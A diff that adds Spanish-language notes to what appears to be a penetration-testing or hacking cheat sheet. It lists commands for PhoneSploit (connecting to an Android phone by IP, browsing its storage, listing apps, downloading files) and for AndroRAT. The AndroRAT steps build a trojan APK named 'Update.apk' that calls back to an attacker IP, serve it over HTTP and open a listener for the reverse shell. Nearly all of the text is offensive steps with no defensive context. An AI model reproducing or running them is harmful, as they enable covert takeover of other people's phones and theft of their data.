@@ -473,3 +473,65 @@ Search files
 File Manager >> download
 
 
+### PhoneSploit
+
+`python3 phonesploit.py`
+
+Colocar IP
+
+`Opción 4`
+
+`pwd`
+
+`ls`
+
+`cd sdcard`
+
+`ls`
+
+
+Listar aplicaciones
+
+Salir del menu
+
+`exit`
+
+`seleccionar opción 14`
+
+`seleccionar opción 15`
+
+escribir nombre de la aplicación
+
+`com.android.calculator2`
+
+
+Descargar archivos
+
+salir al menu principal
+
+`seleccionar opción 9`
+
+colocar directorio o archivo a descargar
+
+`/sdcard/Downloads/images.jpeg`
+
+
+
+## AndroRAT
+
+Crear archivo ejecutable
+
+`python3 androRAT.py --build -i IP_Atacante -p 4444 -o Update.apk`
+
+
+Crear un servidor http para descargar el archivo
+
+`python3 HTTP on 0.0.0.0 port 8888`
+
+
+Crear servicio de escucha para capturar la sesion
+
+`python3 androRAT.py --shell -i 0.0.0.0 -p 4444`
+
+
+
